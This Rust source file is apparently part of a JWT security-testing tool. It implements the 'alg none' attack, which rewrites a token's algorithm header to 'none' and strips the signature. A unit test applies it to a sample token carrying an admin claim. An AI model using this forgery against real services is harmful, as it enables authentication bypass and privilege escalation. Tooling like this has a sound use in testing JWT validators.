use crate::jwt::Token;

pub fn alg_none(token: &mut Token) -> Result<(), Box<dyn std::error::Error>> {
    token.set_alg("none")?;
    token.clear_signature();
    return Ok(());
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::jwt::parse;

    const VALID_TOKEN: &str = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.KMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30";

    fn sample_token() -> Token {
        parse(VALID_TOKEN).unwrap()
    }

    #[test]
    fn alg_none_attack() {
        let mut token = sample_token();
        alg_none(&mut token).unwrap();

        let encoded_token = token.encode().unwrap();

        assert_eq!(token.header["alg"], "none");
        assert!(token.signature.is_empty());

        assert_eq!(encoded_token.split('.').count(), 3);
    }
}
